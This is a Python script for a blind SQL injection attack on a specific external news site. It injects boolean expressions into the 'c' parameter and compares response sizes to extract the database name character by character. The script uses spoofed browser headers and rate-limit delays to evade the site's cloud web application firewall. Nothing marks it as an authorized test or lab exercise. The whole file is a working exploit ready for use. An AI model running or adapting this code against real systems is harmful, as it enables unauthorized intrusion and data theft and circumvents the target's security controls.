#!/usr/bin/env python3
"""zagroup numeric blind v2 - FULL BROWSER HEADERS (bypasses wangdun), 4s interval
Oracle: true=4865 false=4824 (41B diff) - numeric context c=259 aNd (expr)
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
      "Accept-Encoding": "gzip, deflate",
      "Connection": "keep-alive",
      "Upgrade-Insecure-Requests": "1"}
BASE = "http://zagroup.net/news.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        if r.headers.get("Content-Encoding") == "gzip":
            import gzip
            try: body = gzip.decompress(body)
            except Exception: pass
        blocked = b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body
        return r.status, len(body), blocked
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000)), False
    except Exception:
        return 0, 0, False

def get_sz(expr):
    payload = "259%20aNd%20(" + urllib.parse.quote(expr) + ")"
    code, sz, blocked = fetch(BASE + "?c=" + payload)
    time.sleep(4)
    return sz, blocked

# calibrate
print("[*] calibrate", flush=True)
t_vals, f_vals = [], []
for _ in range(3):
    s, b = get_sz("select 1=1")
    if b:
        print("BLOCKED at calib", flush=True); sys.exit(1)
    t_vals.append(s)
    s, b = get_sz("select 1=2")
    if b:
        print("BLOCKED at calib", flush=True); sys.exit(1)
    f_vals.append(s)
t_vals.sort(); f_vals.sort()
t = t_vals[len(t_vals)//2]
f = f_vals[len(f_vals)//2]
print("true=%s med=%d | false=%s med=%d diff=%d" % (t_vals, t, f_vals, f, t - f), flush=True)
threshold = (t + f) / 2

def is_true(expr):
    s, b = get_sz(expr)
    if b:
        print("  blocked %s wait 45s" % s, flush=True)
        time.sleep(45)
        s, b = get_sz(expr)
    return s > threshold

db = ""
for pos in range(1, 12):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
print("DATABASE:", db, flush=True)
